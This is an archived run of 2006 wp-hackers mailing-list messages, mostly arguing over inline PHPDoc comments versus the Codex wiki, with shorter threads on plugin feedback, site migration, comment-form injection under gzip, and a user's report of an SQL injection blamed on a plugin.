Date: Mon Feb 20 01:04:23 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>	<43F5E655.1080608@rcbowen.com>
	<43F5ECA3.3070800@midnightcircus.com>	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
Message-ID: <43F9154A.5010708@robm.me.uk>

Robert Deaton wrote:
> On 2/20/06, Matt Mullenweg <m@mullenweg.com> wrote:
>   
>> David House wrote:
>>     
>>> As Matt has expressed his distaste for comments before really short
>>> functions, here's a more complicated example for list_cats()
>>> (attached).
>>>       
>> What you attached looks like a complicated and less readable version of
>> this:
>>
>> http://codex.wordpress.org/Template_Tags/list_cats
>>
>> Maybe we should just have a link to a Codex page for each complicated
>> function? That has the side effect of being printable and googleable. It
>> can also be updated by anyone, and include rich examples and/or screenshots.
>>     
>
> -1, the codex is far too unreliable as far as I'm concerned, half the
> time its timing out, nowadays its been giving random 500 errors, the
> rest of the time its terribly slow. On being less readable, I think it
> has the advantage of being easier to read than shifting through all
> kinds of useless stuff for developers that's located on the codex,
> since it is geared more toward the end users than those developing the
> source.
>
>
> --
> --Robert Deaton
> http://somethingunpredictable.com
>   
> ------------------------------------------------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   
Surely it would be more prudent to address the problems with the Codex, 
as opposed to dismissing it and moving to inline documentation?

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From false.hopes at gmail.com  Mon Feb 20 02:42:04 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Feb 20 02:43:57 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F9154A.5010708@robm.me.uk>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
	<43F9154A.5010708@robm.me.uk>
Message-ID: <a491f91d0602191842m229c3c56o36ab068aeb30301f@mail.gmail.com>

On 2/20/06, Rob <r@robm.me.uk> wrote:
> Surely it would be more prudent to address the problems with the Codex,
> as opposed to dismissing it and moving to inline documentation?

The codex has been unstable since the day it was started, and has been
in need of fixing for a long, long time. In fact, I think this past
month may have been the best month the codex has seen, and its still
been flakey. At this point, I am convinced, considering that Matt
hasn't even been able to upgrade the codex to the latest version of
MediaWiki, it is the last place I would store anything that needs to
be seen on a regular basis.

I'm not suggesting that we dismiss the codex altogether, but rather
that we not leave something that would have otherwise been documented,
as David already has done for this particular function, out of the
inline documentation just because the information is available
elsewhere.

--
--Robert Deaton
http://somethingunpredictable.com
From ryan at boren.nu  Mon Feb 20 02:59:14 2006
From: ryan at boren.nu (Ryan Boren)
Date: Mon Feb 20 03:01:18 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>	<43F5E655.1080608@rcbowen.com>
	<43F5ECA3.3070800@midnightcircus.com>	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
Message-ID: <43F93082.3080802@boren.nu>

Robert Deaton wrote:
> -1, the codex is far too unreliable as far as I'm concerned, half the
> time its timing out, nowadays its been giving random 500 errors, the
> rest of the time its terribly slow. On being less readable, I think it
> has the advantage of being easier to read than shifting through all
> kinds of useless stuff for developers that's located on the codex,
> since it is geared more toward the end users than those developing the
> source.

In my experience, people developing the source mostly ignore inline 
documentation.  It just gets in the way.  I've been in shops where one 
of the most popular IDE drop-ins was a means to hide all of the annoying 
JavaDOC. Eliminate /** */ from my sight. Inline docs can be handy when 
first familiarizing yourself with a code base, but I prefer reading 
separate API docs for that if I bother reading anything besides what the 
source itself tells me.  I've written thousands of JavaDoc API comments 
and could certainly live with never doing it again.  They have a 
shelf-life of about two weeks after which they are hopelessly 
out-of-date due to the neglect and colossal indifference that follows 
the breathy flush of the original eagerness to document everything inline.

But, to each their own.  I'm fairly ambivalent as long as the format 
used makes it easy to hide inline docs in an IDE so that I don't have to 
scroll through all of it.  That's pretty easy with JavaDoc/PHPDoc.  I 
don't want to maintain it either, so maybe we could have an inline doc 
maintainer who commits updates.  And then a Wiki maintainer for syncing 
the online docs with the inline docs.  And then a bartender for mixing 
the drinks I'll need whenever I accidentally see JavaDoc in the source 
and flashback to the tedious "inline doc reviews" I had to endure for so 
many years.  "I think you should @see this other reference, blah, blah, 
blah.  You don't need to @raises here but you do need to here, blah, 
blah, blah."  Damn, I need a bourbon now. :-)

Ryan
From mark.wordpress at txfx.net  Mon Feb 20 05:26:05 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Mon Feb 20 05:28:07 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F93082.3080802@boren.nu>
References: <43F33C8D.2010509@rcbowen.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>	<43F5E655.1080608@rcbowen.com>
	<43F5ECA3.3070800@midnightcircus.com>	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
	<43F93082.3080802@boren.nu>
Message-ID: <A5E0927D-01DF-4DDD-8F69-B6E621D448E9@txfx.net>

On Feb 19, 2006, at 9:59 PM, Ryan Boren wrote:

> But, to each their own.  I'm fairly ambivalent as long as the  
> format used makes it easy to hide inline docs in an IDE so that I  
> don't have to scroll through all of it.  That's pretty easy with  
> JavaDoc/PHPDoc.  I don't want to maintain it either, so maybe we  
> could have an inline doc maintainer who commits updates.  And then  
> a Wiki maintainer for syncing the online docs with the inline docs.

Sounds good to me.  How about an inline-docs/code-cleanup commit  
person?  :-)

That person could be in charge of reviewing submitted inline-docs and  
code-cleanup submissions and committing them.  They could also review  
patches for other items to make sure they they conform to the coding  
guidelines and have proper tab-indentation, whitespace, if ( 'foo' ==  
$bar ) etc.  Sounds like menial labor, I know, but I'd love to do it.

--
Mark Jaquith
http://txfx.net/


From false.hopes at gmail.com  Mon Feb 20 05:37:06 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Feb 20 05:39:02 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <A5E0927D-01DF-4DDD-8F69-B6E621D448E9@txfx.net>
References: <43F33C8D.2010509@rcbowen.com> <43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
	<43F93082.3080802@boren.nu>
	<A5E0927D-01DF-4DDD-8F69-B6E621D448E9@txfx.net>
Message-ID: <a491f91d0602192137h38f051faoa167f7e79a233925@mail.gmail.com>

On 2/20/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> On Feb 19, 2006, at 9:59 PM, Ryan Boren wrote:
>
> > But, to each their own.  I'm fairly ambivalent as long as the
> > format used makes it easy to hide inline docs in an IDE so that I
> > don't have to scroll through all of it.  That's pretty easy with
> > JavaDoc/PHPDoc.  I don't want to maintain it either, so maybe we
> > could have an inline doc maintainer who commits updates.  And then
> > a Wiki maintainer for syncing the online docs with the inline docs.
>
> Sounds good to me.  How about an inline-docs/code-cleanup commit
> person?  :-)

Sounds good to me as well.

> That person could be in charge of reviewing submitted inline-docs and
> code-cleanup submissions and committing them.  They could also review
> patches for other items to make sure they they conform to the coding
> guidelines and have proper tab-indentation, whitespace, if ( 'foo' ==
> $bar ) etc.  Sounds like menial labor, I know, but I'd love to do it.

You sound like a good candidate to me, if you hadn't already
volunteered, I would, but I'd pick you over me just because ;-)

--
--Robert Deaton
http://somethingunpredictable.com
From nuclearmoose at gmail.com  Mon Feb 20 05:54:35 2006
From: nuclearmoose at gmail.com (Craig)
Date: Mon Feb 20 05:56:29 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <A5E0927D-01DF-4DDD-8F69-B6E621D448E9@txfx.net>
References: <43F33C8D.2010509@rcbowen.com> <43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
	<43F93082.3080802@boren.nu>
	<A5E0927D-01DF-4DDD-8F69-B6E621D448E9@txfx.net>
Message-ID: <5aa3aa0602192154w5145002kc6ecc79f2df1e072@mail.gmail.com>

Mark++
From r at schestowitz.com  Mon Feb 20 06:23:47 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Mon Feb 20 06:20:52 2006
Subject: [wp-hackers] Wp-hackers Stats for January 2006
In-Reply-To: <20060219233901.GM8319@kimmo.suominen.com>
References: <20060219043534.ha2t7zgrumpwcwk8@banana.catalyst2.com>
	<ebe43d680602190129x3f62af4bh@mail.gmail.com>
	<20060219233901.GM8319@kimmo.suominen.com>
Message-ID: <20060220062347.annrc1yksh7o0gcg@banana.catalyst2.com>

_____/ On Sun 19 Feb 2006 23:39:01 GMT, [Kimmo Suominen] wrote : \_____

> On 19/02/06, Roy Schestowitz <r@schestowitz.com> wrote:
>> I could cron this as a monthly job and keep subject lines consistent for
>> killfiles to be set up. If un-/interested, please say so.
>
> Why not set it up as a web page instead of regularly broadcasting to the
> list?  Comparatively, the stats message was quite long...


You're quite right. After posting, I discovered and then experimented with
HTML output options. However, [see below]


_____/ On Sun 19 Feb 2006 09:29:01 GMT, [David House] wrote : \_____

> <snip />
> Yeah, that'd be quite interesting.


...many messages are not RFC-compliant. As a results, some messages get
discarded and statistics become worthless, not interesting. I changed the
code and recompiled, but it was a 'mend and break' situation. I'll try to
find a solution and then just channel the output to a Web page.

Best wishes,

Roy

From m at mullenweg.com  Mon Feb 20 07:12:12 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Mon Feb 20 07:14:13 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>	<43F5E655.1080608@rcbowen.com>
	<43F5ECA3.3070800@midnightcircus.com>	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
Message-ID: <43F96BCC.90008@mullenweg.com>

Robert Deaton wrote:
> -1, the codex is far too unreliable as far as I'm concerned, half the
> time its timing out, nowadays its been giving random 500 errors, the
> rest of the time its terribly slow. On being less readable, I think it
> has the advantage of being easier to read than shifting through all
> kinds of useless stuff for developers that's located on the codex,
> since it is geared more toward the end users than those developing the
> source.

That's really a separate issue. It doesn't need to be the Codex, it 
could be any user-editable rich HTML interface.

If the goal is making things more accessible for new developers, than we 
would be stupid to not have a human readable, searchable, and thorough 
online version.

I don't think we should auto-generate developer documentation for the 
same reasons we don't auto-generate the UI:

http://daringfireball.net/2004/04/spray_on_usability

If the goal is just to get javadoc-formatted style cruft in front of 
every function in WordPress, let's state that directly. I think there is 
a very small percentage of users who intuitively grasp javadoc, and 
while they're loud I highly doubt there's an overlap with the audience 
we're trying to address. It doesn't educate anybody,

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From dmhouse at gmail.com  Mon Feb 20 11:17:34 2006
From: dmhouse at gmail.com (David House)
Date: Mon Feb 20 11:19:30 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F93082.3080802@boren.nu>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
	<43F93082.3080802@boren.nu>
Message-ID: <ebe43d680602200317i713dfb3fn@mail.gmail.com>

On 20/02/06, Ryan Boren <ryan@boren.nu> wrote:
> They have a
> shelf-life of about two weeks after which they are hopelessly
> out-of-date due to the neglect and colossal indifference that follows
> the breathy flush of the original eagerness to document everything inline.

Keep in mind we're not documenting every nook and cranny of every
function: just their parameters and their return values. If you change
the paramters of functions (read: changing the API), then something's
seriously wrong. I doubt we're breaking plugins every two weeks ;)

My main point for including the docs is: why not? Isn't doesn't bloat
the runtime for WP. The devs don't have to do anything other than 'svn
ci'. If we followed this docs-person-with-commit-access idea, then you
wouldn't have to do anything at all. It helps:

1) People developing with ZDE, Eclipse and other IDEs that support
javadoc/phpdoc style comments.
2) People who are learning the WP codebase. We could use phpDocumentor
or something to generate a nice HTML API docs. If we used the codex
then we'd have to invest man hours in copying information from one to
the other, so the choices are basically keep it just in the codex or
keep it both in the core and in HTML format. We also have at least
three files now fully or nearly fully documented, whereas the codex
Function_Reference contains just a handful of functions.
3) Even people who are familiar with the codebase that feel like
reading a six-line comment in english instead of reading a thirty line
function in code. It's a lot quicker to read someone else's
description than to read through the code.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From grijalva at gmail.com  Tue Feb 21 03:58:51 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Tue Feb 21 04:00:51 2006
Subject: [wp-hackers] Looking for input
In-Reply-To: <a0159cd30602160135l4e2ee3c9rf65fff93518d192a@mail.gmail.com>
References: <a0159cd30602151743v6f7fa842k580c0aa08a6e2577@mail.gmail.com>
	<aa74b1910602152034k25945336lf9b7c5b87615d36d@mail.gmail.com>
	<a0159cd30602160048h530cdad0m36e361fd1217b088@mail.gmail.com>
	<a0159cd30602160135l4e2ee3c9rf65fff93518d192a@mail.gmail.com>
Message-ID: <a0159cd30602201958u57a26bf4s94564749ae7079e1@mail.gmail.com>

Ok.  I just put up the latest version of my Coralize plugin.  It contains
pretty much all the features I want to include in the 1.0 version of this
plugin.  I need testers now.  Is this the best place to ask about that or
can someone point me in the right direction?  thanks

http://theblogthatnoonereads.tunasoft.com/coralize/

-dave

On 2/16/06, Dave Grijalva <grijalva@gmail.com> wrote:
>
> I went ahead and applied some of the changes you suggested.  I'm still
> gonna have to go back and cleanup some of the expressions, but I did manage
> to get blacklisting working thanks to your suggestion.
>
> I updated the expressions to allow " and ' for html attributes.
>
> Also, I changed the coralize_site() hook to 'init'.
>
> Please test out the new version if you have a few minutes.
> thanks again for the help.
>
> -dave
>
> On 2/16/06, Dave Grijalva <grijalva@gmail.com> wrote:
> >
> > Hey, thanks for the feedback.  This is my first wp plugin so I'm still
> > learning all the hooks and whatnot.  I'll definitely incorporate these
> > suggestions in the next rev.
> >
> > -dave
> >
> > On 2/15/06, Sam Angove <sam@rephrase.net> wrote:
> > >
> > > On 2/16/06, Dave Grijalva <grijalva@gmail.com> wrote:
> > > > I don't know if this is the right place to ask this, but I've been
> > > working
> > > > on a wordpress plugin and I'm looking for some testers/feedback from
> > > other
> > > > wp hackers.  Anyway, the url is
> > > > http://theblogthatnoonereads.tunasoft.com/coralize/
> > >
> > > That looks like a great plugin. A few things from browsing the source:
> > >
> > >
> > > * `wp_head` is a really bad hook to put `coralize_site()` on, since
> > > it's theme-dependent and called very late. Maybe `plugins_loaded` or
> > > `init`.
> > >
> > > * For the blacklist regex, you can use negative lookahead. Something
> > > like:
> > >
> > >     (<img\s+.*?src="http://(?!(example.com|example.net
> > > )).*?)(/.*?".*?>)
> > >
> > > * Single quotes are also valid for HTML attributes, but the plugin
> > > only matches double quotes.
> > >
> > > * Is there some reason I don't see to use `coralize_preg_domain()`
> > > instead of PHP's `preg_quote()`?
> > >
> > > * Just for general readability, you don't need to backslash-escape
> > > nearly so much in the regular expressions, especially if you use
> > > something other than forward-slash as the delimiter.
> > >
> > > :)
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers@lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
>
From nuclearmoose at gmail.com  Tue Feb 21 04:23:32 2006
From: nuclearmoose at gmail.com (Craig)
Date: Tue Feb 21 04:25:32 2006
Subject: [wp-hackers] Looking for input
In-Reply-To: <a0159cd30602201958u57a26bf4s94564749ae7079e1@mail.gmail.com>
References: <a0159cd30602151743v6f7fa842k580c0aa08a6e2577@mail.gmail.com>
	<aa74b1910602152034k25945336lf9b7c5b87615d36d@mail.gmail.com>
	<a0159cd30602160048h530cdad0m36e361fd1217b088@mail.gmail.com>
	<a0159cd30602160135l4e2ee3c9rf65fff93518d192a@mail.gmail.com>
	<a0159cd30602201958u57a26bf4s94564749ae7079e1@mail.gmail.com>
Message-ID: <5aa3aa0602202023y248ae409jbfafe6f0775d2c8a@mail.gmail.com>

On 2/20/06, Dave Grijalva <grijalva@gmail.com> wrote:
>
> <snip? I need testers now.  Is this the best place to ask about that or
> can someone point me in the right direction?  thanks
>
> http://theblogthatnoonereads.tunasoft.com/coralize/
>
> -dave
> <snip?


How about the wp-testers mailing list? :)
Craig.
From false.hopes at gmail.com  Tue Feb 21 04:40:34 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Tue Feb 21 04:42:33 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F96BCC.90008@mullenweg.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F90690.9030003@mullenweg.com>
	<a491f91d0602191620l77e990edod7d83d108c9b32fa@mail.gmail.com>
	<43F96BCC.90008@mullenweg.com>
Message-ID: <a491f91d0602202040o5c4804d6gf202b7c3d092df98@mail.gmail.com>

On 2/20/06, Matt Mullenweg <m@mullenweg.com> wrote:
> If the goal is making things more accessible for new developers, than we
> would be stupid to not have a human readable, searchable, and thorough
> online version.

The codex has already tried to do this, and failed miserably.

> I don't think we should auto-generate developer documentation for the
> same reasons we don't auto-generate the UI:

We don't autogenerate UI because it has to be something completely
understandable to an end user. This, is a seperate issue, for
developers, and tons of open source communities throughout the world
have already proven that PHPDoc or similar is a great resource for
developers, its UI has already been well thought out, and proven to
work.

> http://daringfireball.net/2004/04/spray_on_usability

I don't know what the heck this has to do with anything, really.

> If the goal is just to get javadoc-formatted style cruft in front of
> every function in WordPress, let's state that directly. I think there is
> a very small percentage of users who intuitively grasp javadoc
We're talking about developers, not users, and very few people
intuitively grasp anything, but the learning curve is incredibly
small, and the benefit is large.

<snip>
> It doesn't educate anybody,
How so? Sure, for you, having been the lead developer of the project
for many years, I can see not understanding where the benefit of this
comes in, but for the rest of the world that doesn't have function
names, their uses, and the argument orders memorized, a quick way to
find out without having to pull up a webbrowser or a seperate program
and go searching is highly appreciated, even for a few of us who have
been around here for years as well, as you can see from the rest of
the thread. The new developers can in the mean time cut straight to
developing, and when they find a function that they're unsure of, they
read the inline documentation and move along, instead of trying to
figure out what the heck some of the sloppy functions in the core do
(yes, i said it).


--
--Robert Deaton
http://somethingunpredictable.com
From podz at tamba2.org.uk  Tue Feb 21 20:31:52 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb 21 20:33:55 2006
Subject: [wp-hackers] Moving sites
Message-ID: <43FB78B8.6030203@tamba2.org.uk>

http://wordpress.org/support/topic/61938?replies=8#post-330687

There have been a couple of these happen:
Blog is moved
Cache cleared
Siteurl and home are correct
and yet WP says it is not installed.

It's happened when the domain name has changed and when it has not.
I'm sure it's not a 'newbie' error.

Did something change in the code ?
Is there now information stored elsewhere ?

P.
From wantmoore at gmail.com  Tue Feb 21 22:26:50 2006
From: wantmoore at gmail.com (Justin Moore)
Date: Tue Feb 21 22:28:50 2006
Subject: [wp-hackers] Moving sites
In-Reply-To: <43FB78B8.6030203@tamba2.org.uk>
References: <43FB78B8.6030203@tamba2.org.uk>
Message-ID: <75835fe10602211426we9a0d2hd0b8d8cb55d19236@mail.gmail.com>

On 2/21/06, Podz <podz@tamba2.org.uk> wrote:
> http://wordpress.org/support/topic/61938?replies=8#post-330687

I responded on the forums, but is it at all possible that the user is
connecting to the wrong database or not connecting at all?

http://www.jessiandmatt.net/wordpress/

Shows the database connection error page - not the "It doesn't look
like you've installed WP yet" page.

--
Justin Moore
aka wantmoore
---------------------------------------
www.wantmoore.com
From lists at abhaykumar.net  Wed Feb 22 02:09:12 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Wed Feb 22 02:11:13 2006
Subject: [wp-hackers] Moving sites
In-Reply-To: <75835fe10602211426we9a0d2hd0b8d8cb55d19236@mail.gmail.com>
References: <43FB78B8.6030203@tamba2.org.uk>
	<75835fe10602211426we9a0d2hd0b8d8cb55d19236@mail.gmail.com>
Message-ID: <512061b90602211809y5563515ewaa3efe2c31af541e@mail.gmail.com>

Sometimes, hosts like to add some string in front of a database that's
not always clear. something like domain_-_database rather than just
database.

It's possible, as Justin mentioned, that it's something to do with
connecting to the database,

- Abhay

On 2/21/06, Justin Moore <wantmoore@gmail.com> wrote:
> On 2/21/06, Podz <podz@tamba2.org.uk> wrote:
> > http://wordpress.org/support/topic/61938?replies=8#post-330687
>
> I responded on the forums, but is it at all possible that the user is
> connecting to the wrong database or not connecting at all?
>
> http://www.jessiandmatt.net/wordpress/
>
> Shows the database connection error page - not the "It doesn't look
> like you've installed WP yet" page.
>
> --
> Justin Moore
> aka wantmoore
> ---------------------------------------
> www.wantmoore.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>


--
Abhay Kumar
http://abhaykumar.net/
From eric at meyerweb.com  Wed Feb 22 18:15:59 2006
From: eric at meyerweb.com (Eric A. Meyer)
Date: Wed Feb 22 18:18:08 2006
Subject: [wp-hackers] Form injection and gzipping
Message-ID: <a05210600c0225ad80351@[192.168.1.101]>

Howdy,

    So back in November, Jeremy Dunck finally tracked down[1] the 
cause of the last major bug in WP-Gatekeeper[2], where it wouldn't 
auto-add itself to comment forms on many people's sites.  The 
problem, it seems, is that the attempt to auto-add the challenge 
happens after the page is gzipped when that option is turned on, so 
the regexps fail.  (Obviously!)  So if gzipping is enabled, as it is 
for most people, the auto-injection won't work.  Manual injection, 
where the user adds a PHP command to add the challenge to their form 
template, works whether gzipping is enabled or not.
    So what I'm wondering is if this fixed in WP2, or if there's a way 
I could alter the order of regexing and zipping for WP1.5 and up.

[1] 
http://dunck.us/anabasis/archives/2005/11/05/details-on-wp-gatekeeper-15-rc4s-auto-injection-bug/
[2] http://meyerweb.com/eric/tools/wordpress/wp-gatekeeper.html

-- 
Eric A. Meyer  (eric@meyerweb.com)
Principal, Complex Spiral Consulting   http://complexspiral.com/
"CSS: The Definitive Guide," "CSS2.0 Programmer's Reference,"
"Eric Meyer on CSS," and more    http://meyerweb.com/eric/books/
From dmhouse at gmail.com  Wed Feb 22 18:31:53 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb 22 18:33:57 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <a05210600c0225ad80351@192.168.1.101>
References: <a05210600c0225ad80351@192.168.1.101>
Message-ID: <ebe43d680602221031l4d66b868s@mail.gmail.com>

On 22/02/06, Eric A. Meyer <eric@meyerweb.com> wrote:
>     So what I'm wondering is if this fixed in WP2, or if there's a way
> I could alter the order of regexing and zipping for WP1.5 and up.

Why on earth are you using regexes to insert something into WP pages?
Can't you use a filter like comment_form?

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From eric at meyerweb.com  Wed Feb 22 18:48:10 2006
From: eric at meyerweb.com (Eric A. Meyer)
Date: Wed Feb 22 18:50:14 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <ebe43d680602221031l4d66b868s@mail.gmail.com>
References: <a05210600c0225ad80351@192.168.1.101>
	<ebe43d680602221031l4d66b868s@mail.gmail.com>
Message-ID: <a05210601c02261d3a61c@[192.168.1.101]>

At 6:31 PM +0000 2/22/06, David House wrote:
>On 22/02/06, Eric A. Meyer <eric@meyerweb.com> wrote:
>>      So what I'm wondering is if this fixed in WP2, or if there's a way
>>  I could alter the order of regexing and zipping for WP1.5 and up.
>
>Why on earth are you using regexes to insert something into WP pages?
>Can't you use a filter like comment_form?

    I'm going to assume that you read the Gatekeeper page and 
understand why I'm trying to insert something into the form, and that 
I'm trying to do so in a specific place.
    I use regexes because I couldn't find another way to do what I 
wanted to do; none of the hooks I studied (and there were a lot) did 
the right thing.  If there is a better way, I'm certainly open to 
using it.  I'll likely need some hand-holding to get started on that 
better path, though.

-- 
Eric A. Meyer  (eric@meyerweb.com)
Principal, Complex Spiral Consulting   http://complexspiral.com/
"CSS: The Definitive Guide," "CSS2.0 Programmer's Reference,"
"Eric Meyer on CSS," and more    http://meyerweb.com/eric/books/
From podz at tamba2.org.uk  Wed Feb 22 19:03:43 2006
From: podz at tamba2.org.uk (Podz)
Date: Wed Feb 22 19:05:50 2006
Subject: [wp-hackers] Forum Post: SQL Injection
Message-ID: <43FCB58F.80808@tamba2.org.uk>

"My personal blog powered by WordPress 2.0.1 (latest version) hacked
today! (SQL injection probably) As I was watching the tab of the browser
to loading my blog, a frame appeared in sidebar and mutilated blog design.
This frame added to last category. It was getting from this address:
http:// www. pragma.ru/ ~dch/ inc/

It added to a lot of field such as blog description in options section
and Category name too. I have been looking at it for the last four hour
and still can't understand what it is about? How resolve this bug? All
plugins are secure! "

It is not theme files (see thread).

Advice would be good.

P.
From podz at tamba2.org.uk  Wed Feb 22 19:07:45 2006
From: podz at tamba2.org.uk (Podz)
Date: Wed Feb 22 19:09:48 2006
Subject: [wp-hackers] Forum Post: SQL Injection
In-Reply-To: <43FCB58F.80808@tamba2.org.uk>
References: <43FCB58F.80808@tamba2.org.uk>
Message-ID: <43FCB681.5090009@tamba2.org.uk>

Podz wrote:
> "My personal blog powered by WordPress 2.0.1 (latest version) hacked
> today! (SQL injection probably) .......

That'll be this thread then :)
http://wordpress.org/support/topic/62162?replies=7#post-331298
From dougal at gunters.org  Wed Feb 22 20:27:22 2006
From: dougal at gunters.org (Dougal Campbell)
Date: Wed Feb 22 20:38:27 2006
Subject: [wp-hackers] Forum Post: SQL Injection
In-Reply-To: <43FCB681.5090009@tamba2.org.uk>
References: <43FCB58F.80808@tamba2.org.uk> <43FCB681.5090009@tamba2.org.uk>
Message-ID: <43FCC92A.8010309@gunters.org>

Podz wrote:
> Podz wrote:
>> "My personal blog powered by WordPress 2.0.1 (latest version) hacked
>> today! (SQL injection probably) .......
> 
> That'll be this thread then :)
> http://wordpress.org/support/topic/62162?replies=7#post-331298

See my comment:

   http://wordpress.org/support/topic/62162?replies=11#post-331334

I believe that the SQL injection occurred via the Click Counter plugin 
on this user's site. I've left a comment about it on Ozh's site, as well.

-- 
Dougal Campbell <dougal@gunters.org>
http://dougal.gunters.org/

From per at soderlind.no  Thu Feb 23 23:29:15 2006
From: per at soderlind.no (=?us-ascii?Q?Per_Soderlind?=)
Date: Fri Feb 24 00:50:31 2006
Subject: [wp-hackers] fwiw: informing a user that a updated plugin is
	avaiable
In-Reply-To: <43FCC92A.8010309@gunters.org>
Message-ID: <009e01c638d0$f6bb4960$0505210a@PICTO>

One of the main problems a plugin author has, when he/she updates a plugin,
is to tell the user that a new version is avalable.

